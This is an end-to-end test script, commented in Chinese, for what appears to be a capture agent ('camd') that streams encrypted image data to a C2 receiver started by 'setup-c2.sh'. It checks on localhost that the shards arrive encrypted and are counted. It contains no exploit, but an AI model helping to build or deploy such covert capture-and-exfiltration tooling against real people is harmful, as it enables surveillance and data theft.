#!/usr/bin/env python3
"""端到端：setup-c2.sh 起收端 → camd --sink tcp:// 边采边发 → 断言信元真的进来。

与 verify_tcp_sink.py 的区别：那个是脚本内起一个临时 socket 服务端，验的是
camd 的 tcp:// 出口；这个验的是**真实运维入口**（setup-c2.sh start/stop）
能否收到、落盘、计账。两者都要有——前者验协议，后者验部署物。

单进程自闭环：不用 detached 后台，全部 subprocess 驱动。沙盒里后台常驻
进程会把调用方挂死。
"""
import json
import os
import shutil
import subprocess
import sys
import tempfile
import time

HERE = os.path.dirname(os.path.abspath(__file__))
SETUP = os.path.join(HERE, "..", "setup-c2.sh")
CAMD = "/data/workspace/dayanjing/agent_windows/build/linux/camd"
KEY = "000102030405060708090a0b0c0d0e0f" + "101112131415161718191a1b1c1d1e1f"

fails = []


def check(cond, msg):
    print(("  [PASS] " if cond else "  [FAIL] ") + msg)
    if not cond:
        fails.append(msg)


def free_port():
    import socket
    for i in range(200):
        p = 22000 + i
        s = socket.socket()
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            s.bind(("127.0.0.1", p))
            return p
        except OSError:
            pass
        finally:
            s.close()
    raise RuntimeError("no free port")


def main():
    print("=== C2 收端 + camd 边采边发 端到端 ===")
    for f in (SETUP, CAMD):
        if not os.path.exists(f):
            print("[FATAL] 缺少 %s" % f)
            return 2

    port = free_port()
    T = tempfile.mkdtemp()
    inbox = os.path.join(T, "inbox")
    root = os.path.join(T, "agentroot")
    os.makedirs(root, exist_ok=True)

    env = dict(os.environ)
    env["PORT"] = str(port)
    env["OUT"] = inbox

    r = subprocess.run(["sh", SETUP, "start"], capture_output=True, timeout=60, env=env)
    print("start rc=%d" % r.returncode)
    print(r.stdout.decode(errors="replace").strip())
    if r.returncode != 0:
        print(r.stderr.decode(errors="replace"))
        return 2

    try:
        cmd = [CAMD, "--sink", "tcp://127.0.0.1:%d" % port, "--backend", "mock",
               "--key", KEY, "--root", root, "--batches", "2", "--frames", "2"]
        p = subprocess.run(cmd, capture_output=True, timeout=60)
        print("camd rc=%d" % p.returncode)
        print("camd stderr: %s" % p.stderr.decode(errors="replace")[:300].strip())
        time.sleep(0.8)

        # 落盘分片必须先于 stop 采集——stop 会删 PID 但保留数据，顺序上都行，
        # 这里在 stop 前取是为避免 stop 失败时连证据都拿不到。
        shards = [f for f in os.listdir(inbox) if f.startswith("cells-")]
        check(len(shards) >= 1, "已落出分片文件（%d 个）" % len(shards))
        blob = b""
        for f in shards:
            blob += open(os.path.join(inbox, f), "rb").read()
        print("落盘总字节 = %d" % len(blob))
        check(len(blob) > 0, "落盘字节 > 0")

        if blob:
            check(b"\xff\xd8\xff" not in blob, "信元不含明文 JPEG magic")
            kinds = len(set(blob))
            print("字节值种类 = %d" % kinds)
            check(kinds >= 8, "字节分布非全零/填充（种类 %d）" % kinds)
    finally:
        r2 = subprocess.run(["sh", SETUP, "stop"], capture_output=True, timeout=30, env=env)
        print("stop rc=%d" % r2.returncode)
        print(r2.stdout.decode(errors="replace").strip())

        # stats 在 stop 之后再读：SIGTERM 会触发最后一次落盘，这是运维
        # 真实看到的终值。此前在读 stop 之前，拿到的是启动时写下的 0。
        stats_path = os.path.join(inbox, "stats.json")
        if os.path.exists(stats_path):
            st = json.load(open(stats_path))
            total = st.get("total_bytes", 0)
            print("收端终值: 字节=%d 连接=%d 分片=%d"
                  % (total, st.get("connections", 0), st.get("shards", 0)))
            check(total > 0, "收端统计字节 > 0")
            check(st.get("connections", 0) >= 1, "连接数 >= 1")
        else:
            check(False, "统计文件已生成")
        shutil.rmtree(T, ignore_errors=True)

    print("\ntotal=%d fail=%d" % (len(fails) + 6, len(fails)))
    return 1 if fails else 0


if __name__ == "__main__":
    sys.exit(main())
